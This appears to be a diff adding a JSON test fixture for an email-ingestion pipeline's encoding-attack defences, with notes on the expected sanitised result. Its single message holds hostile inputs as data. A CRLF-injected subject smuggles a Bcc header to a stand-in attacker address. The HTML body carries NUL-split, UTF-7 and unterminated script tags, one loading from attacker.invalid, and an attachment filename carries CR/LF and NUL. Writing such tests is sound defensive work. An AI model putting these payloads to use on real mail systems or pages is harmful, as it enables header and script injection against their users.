@@ -1,0 +1,50 @@
+{
+  "_meta": {
+    "title": "Encoding attacks — RFC-2047 encoded-word subject, CRLF in the subject, charset trickery, NUL inside a tag name, unterminated tag, zero-width padding",
+    "covers": "§7.6 corpus: encoding attacks (charset tricks, RFC-2047 encoded headers, base64/quoted-printable edge cases)",
+    "expect": "204; threaded; stored subject is a SINGLE line with no CR/LF (so it can never be replayed into an outbound header) and no control characters; the NUL-split tag name and the UTF-7 payload are inert in the stored HTML; the unterminated <script tail is dropped, not re-emitted; the CRLF-bearing attachment filename is flattened before it can reach a Content-Disposition header"
+  },
+  "items": [
+    {
+      "Uuid": [
+        "c1d0a1b2-0000-4000-8000-00000000a011"
+      ],
+      "MessageId": "<encoding-11-{{RUN}}@attacker.invalid>",
+      "From": {
+        "Name": "=?UTF-8?B?RGl0YSBQcmFtZXN3YXJp?=",
+        "Address": "dita@client-one.invalid"
+      },
+      "To": [
+        {
+          "Name": "",
+          "Address": "reply+{{TOKEN}}@{{REPLY_DOMAIN}}"
+        }
+      ],
+      "Cc": [],
+      "Recipients": [
+        "reply+{{TOKEN}}@{{REPLY_DOMAIN}}"
+      ],
+      "SentAtDate": "Tue, 04 Aug 2026 11:30:00 +0800",
+      "Subject": "=?UTF-8?B?UmU6IEFwcHJvdmVk?=\r\nBcc: attacker@evil.invalid\r\nSubject: second subject\u0007",
+      "RawTextBody": "Approved\u0000 with a NUL, a bell \u0007, and a zero​width space.\r\nSecond line.",
+      "RawHtmlBody": "<p>Approved with encoding tricks.</p><scr\u0000ipt>alert(1)</scr\u0000ipt><p>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</p><p>&lt;script&gt;already-escaped&lt;/script&gt;</p><p>&#60;script&#62;numeric&#60;/script&#62;</p><p>tail before the unterminated tag</p><script src=\"https://attacker.invalid/x.js\"",
+      "ExtractedMarkdownMessage": "Approved with encoding tricks.",
+      "Attachments": [
+        {
+          "Name": "in\r\nvoice\u0000.txt",
+          "ContentType": "text/plain",
+          "ContentLength": 4,
+          "ContentID": null,
+          "DownloadToken": "fixture-token-11",
+          "Content": "b2theQ=="
+        }
+      ],
+      "Headers": {
+        "Content-Type": "text/html; charset=UTF-7",
+        "Content-Transfer-Encoding": "quoted-printable",
+        "Message-Id": "<encoding-11-{{RUN}}@attacker.invalid>"
+      },
+      "SpamScore": 7.4
+    }
+  ]
+}
